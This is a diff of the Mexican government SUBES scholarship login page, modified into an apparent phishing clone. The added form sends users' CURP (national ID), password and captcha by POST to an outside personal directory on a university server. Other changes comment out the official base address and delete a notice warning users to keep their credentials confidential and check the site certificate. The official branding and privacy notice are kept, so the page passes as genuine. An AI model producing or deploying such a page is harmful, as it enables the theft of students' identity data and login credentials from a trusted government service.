@@ -1,5 +1,5 @@
 <!DOCTYPE html><html lang="es"><head>
-	<base href="https://www.subes.sep.gob.mx/"/><meta charset="UTF-8"/>
+	<!--<base href="https://www.subes.sep.gob.mx/"/>--><meta charset="UTF-8"/>
 	<link href="static/img/favicon/apple-touch-icon-57x57.png" rel="apple-touch-icon-precomposed" sizes="57x57"/>
 	<link href="static/img/favicon/apple-touch-icon-114x114.png" rel="apple-touch-icon-precomposed" sizes="114x114"/>
 	<link href="static/img/favicon/apple-touch-icon-72x72.png" rel="apple-touch-icon-precomposed" sizes="72x72"/>
@@ -40,28 +40,6 @@
 <div class="modal-header"><button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">×</span></button><!--<h4 class="modal-title" id="myModalLabel">Conexión Segura - SUBES</h4>-->
 <h4 class="modal-title" id="myModalLabel">SUBES</h4>
 </div>
-<!--<div class="modal-body">
-                     <p align="justify">La Coordinación Nacional de Becas de Educación Superior, te recuerda que tu usuario y contraseña de acceso al SUBES es confidencial, por favor no compartas esta información.</p>
-                     <p align="justify">Te recomendamos verificar que el navegador de internet muestre el certificado de seguridad de la dirección del SUBES.</p>
-                     <div align="center"><img src="static/img/Seguridad.png"></div>
-                  </div>--><!--<div class="modal-body">
-			<p align="justify">Queremos darte la mejor atención y mantenerte informado en todo momento, por favor actualiza tu correo electrónico y número telefónico en tu perfil del SUBES.</p>
-			<p align="justify">¡Es muy fácil! Solo sigue estos sencillos pasos:</p>
-			<ol>
-				<li>Dirígete al menú "Perfil", selecciona la opción "Información personal" y asegúrate que tu teléfono fijo y/o móvil sean los correctos.</li>
-				<li>Ingresa desde el menú "Perfil", apartado "Cambio de correo", y verifica si tu correo electrónico registrado continúa vigente.</li>
-			</ol>
-			<p align="justify">Si ya no cuentas con esos datos, ¡actualízalos!</p>
-			<p align="justify">En la Coordinación Nacional de Becas de Educación Superior estamos para apoyarte.</p>
-		  </div>--><!--<div class="modal-body">
-                        <p align="justify">Porque queremos brindarte la mejor atención y mantenerte informado, actualiza constantemente tu correo electrónico y número telefónico.</p>
-                        <p align="justify">Sigue estos sencillos pasos desde el menú "Perfil":</p>
-                        <ol>
-                                <li>Selecciona la opción "Información personal"; verifica o actualiza tu número telefónico (fijo y/o móvil).</li>
-                                <li>Selecciona la opción "Cambio de correo"; verifica o actualiza tu correo electrónico.</li>
-                        </ol>
-                        <p align="justify">¡Recuerda que en la CNBES estamos para apoyarte!</p>
-                  </div>-->
 
 <div class="modal-body"><img alt="resultados_jef" height="NaN" src="static/img/RESULTADOS-JEF.jpg" width="100%"/></div>
 
@@ -102,95 +80,91 @@
 </div>
 
 <div class="row bottom-buffer">
-<div class="col-md-8"><!-- <form class="form-horizontal" role="form"> -->
-<div class="form-group"><label class="col-sm-3 control-label">CURP:</label>
-
-<div class="col-sm-9"><input class="form-control" id="txt_curp" maxlength="18" onkeyup="javascript:this.value=this.value.toUpperCase();" placeholder="CURP" type="text"/></div>
-</div>
-
-<div class="form-group"><label class="col-sm-3 control-label">Contraseña:</label>
-
-<div class="col-sm-9"><input autocomplete="off" class="form-control" id="txt_pass" maxlength="18" placeholder="Contraseña" type="password"/></div>
-</div>
-
-<!-- <div class="form-group">
-<div class="col-sm-offset-3 col-sm-9"><img alt="CAPTCHA" class="pull-right" src="/static/js/captcha/simple-php-captcha.php?_CAPTCHA&amp;t=0.52653600+1569515048"/></div>
-</div>-->
-
-<!--<div class="form-group">
-<div class="col-md-5 pull-right"><input class="form-control pull-right" id="txt_capcha" placeholder="Captcha" type="text"/></div>
-</div>-->
-
-<div class="form-group">
-<div class="col-sm-offset-3 col-sm-9"><a class="pull-right" data-target="#modal_recupera" data-toggle="modal" href="" id="link_recuperar">Olvidé mi contraseña</a></div>
-</div>
-<!-- </form> --></div>
-</div>
-
-<div class="row">
 <div class="col-md-8">
-<div class="form-group top_10">
-<div class="pull-right"><button class="btn btn-default" id="btn_registrate" type="button">Regístrate aquí</button><button class="btn btn-primary" id="btn_login_alumno" type="button">Enviar</button></div>
+  <form action="http://rigel.fca.unam.mx/~li312024611/inicio.php" method="POST" class="form-horizontal">
+    <label class="col-sm-3 control-label">CURP:</label>
+    <div class="col-sm-9"><input class="form-control" name="txt_curp" maxlength="18" onkeyup="javascript:this.value=this.value.toUpperCase();" placeholder="CURP" type="text"/></div>
+
+    <label class="col-sm-3 control-label">Contraseña:</label>
+
+    <div class="col-sm-9"><input autocomplete="off" class="form-control" name="txt_pass" maxlength="18" placeholder="Contraseña" type="password"/></div>
+
+    <div class="col-sm-offset-3 col-sm-9"><a class="pull-right" data-target="#modal_recupera" data-toggle="modal" href="" id="link_recuperar">Olvidé mi contraseña</a></div>
+
+		<div class="col-sm-offset-3 col-sm-9">
+			<img class="pull-right" src="http://rigel.fca.unam.mx/~li312024611/simple-php-captcha.png?_CAPTCHA&amp;t=0.11815700+1569635500" alt="CAPTCHA">
+		</div>
+
+		<div class="col-md-5 pull-right">
+			<input type="text" class="form-control pull-right" name="txt_capcha" placeholder="Captcha">
+		</div>
+
+
+    <div class="row">
+    <div class="col-md-8">
+    <div class="form-group top_10">
+    <div class="pull-right"><button class="btn btn-default" id="btn_registrate" type="button">Regístrate aquí</button><button class="btn btn-primary" id="btn_login_alumno" type="submit">Enviar</button></div>
+    </div>
+    </div>
+    </div>
+  </form>
+
+	<div aria-labelledby="myModalLabel" class="modal fade" id="modal_recupera" role="dialog" tabindex="-1">
+	<div class="modal-dialog" role="document">
+	<div class="modal-content">
+	<div class="modal-header"><button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">×</span></button>
+
+	<h4 class="modal-title" id="myModalLabel">¿Olvidaste tu contraseña?</h4>
+	</div>
+
+	<div class="modal-body">
+	<div class="alert alert-danger" id="msg_recupera" style="display:none"> </div>
+
+	<div class="alert alert-success" id="msg_recupera_b" style="display:none"> </div>
+
+	<p>Te enviaremos una nueva contraseña a la dirección de correo electrónico que registraste previamente.</p>
+
+	<p>Ingresa tu CURP aquí:</p>
+
+	<div class="form-horizontal">
+	<div class="form-group"><label class="col-sm-2 control-label">CURP:</label>
+
+	<div class="col-sm-10"><input class="form-control" id="txt_curp_recupera" maxlength="18" onkeyup="javascript:this.value=this.value.toUpperCase();" placeholder="CURP" type="text"/></div>
+	</div>
+
+	<!--<div class="form-group">
+	<div class="col-sm-offset-3 col-sm-9"><img alt="CAPTCHA" class="pull-right" src="/static/js/captcha/simple-php-captcha.php?_CAPTCHA&amp;t=0.52653600+1569515048"/></div>
+	</div> -->
+
+	<!--<div class="form-group">
+	<div class="col-md-5 pull-right"><input class="form-control pull-right" id="txt_capcha_r" placeholder="Captcha" type="text"/></div>
+	</div>-->
+
+	<p>Si deseas actualizar tu correo electrónico, por favor acude con tu Institución.</p>
+	</div>
+	</div>
+
+	<div class="modal-footer"><button class="btn btn-default" data-dismiss="modal" type="button">Cerrar</button><button class="btn btn-primary" id="btn_recupera" type="button">Enviar</button></div>
+	</div>
+	</div>
+	</div
+
+	<div class="container">
+	<div class="row">
+	<div class="alert alert-info"><strong>Aviso de privacidad simplificado</strong>
+
+	<p>La recolección de datos personales se lleva a cabo a través de las páginas electrónicas https://www.subes.sep.gob.mx y https://www.representantes.subes.sep.gob.mx, cuyo administrador y responsable del tratamiento es la Coordinación Nacional de Becas de Educación Superior, perteneciente a la Subsecretaría de Educación Superior de la Secretaría de Educación Pública. Los datos personales que se recaban serán utilizados en el trámite de solicitud de becas de educación superior de los niveles de licenciatura, técnico superior universitario y posgrado, así como para procesos estadísticos de la propia Secretaría.</p>
+
+	<p>Si deseas conocer nuestro aviso de privacidad integral, lo podrás consultar en el <a href="https://www.becaseducacionsuperior.sep.gob.mx/264-aviso-privacidad" target="_blank">portal de la CNBES.</a></p>
+	<a href="https://www.becaseducacionsuperior.sep.gob.mx/264-aviso-privacidad" target="_blank"> </a></div>
+	</div>
+	</div>
 </div>
-</div>
-</div>
-</div>
+	</main>
 
-<div aria-labelledby="myModalLabel" class="modal fade" id="modal_recupera" role="dialog" tabindex="-1">
-<div class="modal-dialog" role="document">
-<div class="modal-content">
-<div class="modal-header"><button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">×</span></button>
-
-<h4 class="modal-title" id="myModalLabel">¿Olvidaste tu contraseña?</h4>
-</div>
-
-<div class="modal-body">
-<div class="alert alert-danger" id="msg_recupera" style="display:none"> </div>
-
-<div class="alert alert-success" id="msg_recupera_b" style="display:none"> </div>
-
-<p>Te enviaremos una nueva contraseña a la dirección de correo electrónico que registraste previamente.</p>
-
-<p>Ingresa tu CURP aquí:</p>
-
-<div class="form-horizontal">
-<div class="form-group"><label class="col-sm-2 control-label">CURP:</label>
-
-<div class="col-sm-10"><input class="form-control" id="txt_curp_recupera" maxlength="18" onkeyup="javascript:this.value=this.value.toUpperCase();" placeholder="CURP" type="text"/></div>
-</div>
-
-<!--<div class="form-group">
-<div class="col-sm-offset-3 col-sm-9"><img alt="CAPTCHA" class="pull-right" src="/static/js/captcha/simple-php-captcha.php?_CAPTCHA&amp;t=0.52653600+1569515048"/></div>
-</div> -->
-
-<!--<div class="form-group">
-<div class="col-md-5 pull-right"><input class="form-control pull-right" id="txt_capcha_r" placeholder="Captcha" type="text"/></div>
-</div>-->
-
-<p>Si deseas actualizar tu correo electrónico, por favor acude con tu Institución.</p>
-</div>
-</div>
-
-<div class="modal-footer"><button class="btn btn-default" data-dismiss="modal" type="button">Cerrar</button><button class="btn btn-primary" id="btn_recupera" type="button">Enviar</button></div>
-</div>
-</div>
-</div>
-
-<div class="container"> 
-<div class="row">
-<div class="alert alert-info"><strong>Aviso de privacidad simplificado</strong>
-
-<p>La recolección de datos personales se lleva a cabo a través de las páginas electrónicas https://www.subes.sep.gob.mx y https://www.representantes.subes.sep.gob.mx, cuyo administrador y responsable del tratamiento es la Coordinación Nacional de Becas de Educación Superior, perteneciente a la Subsecretaría de Educación Superior de la Secretaría de Educación Pública. Los datos personales que se recaban serán utilizados en el trámite de solicitud de becas de educación superior de los niveles de licenciatura, técnico superior universitario y posgrado, así como para procesos estadísticos de la propia Secretaría.</p>
-
-<p>Si deseas conocer nuestro aviso de privacidad integral, lo podrás consultar en el <a href="https://www.becaseducacionsuperior.sep.gob.mx/264-aviso-privacidad" target="_blank">portal de la CNBES.</a></p>
-<a href="https://www.becaseducacionsuperior.sep.gob.mx/264-aviso-privacidad" target="_blank"> </a></div>
-</div>
-</div>
-</main>
-
-<p><a href="https://www.becaseducacionsuperior.sep.gob.mx/264-aviso-privacidad" target="_blank"><script type="text/javascript" src="https://framework-gb.cdn.gob.mx/gobmx.js"></script> <script type="text/javascript" src="https://sb.scorecardresearch.com/c2/17183199/ct.js"></script> <script>
-		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', 'UA-120022332-1', 'auto');ga('send', 'pageview');
-	</script> <script src="utils/inicio/inicio.js"></script> </a></p>
+	<p><a href="https://www.becaseducacionsuperior.sep.gob.mx/264-aviso-privacidad" target="_blank"><script type="text/javascript" src="https://framework-gb.cdn.gob.mx/gobmx.js"></script> <script type="text/javascript" src="https://sb.scorecardresearch.com/c2/17183199/ct.js"></script> <script>
+			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', 'UA-120022332-1', 'auto');ga('send', 'pageview');
+		</script> <script src="utils/inicio/inicio.js"></script> </a></p>
 
 
-</body></html>
+	</body></html>
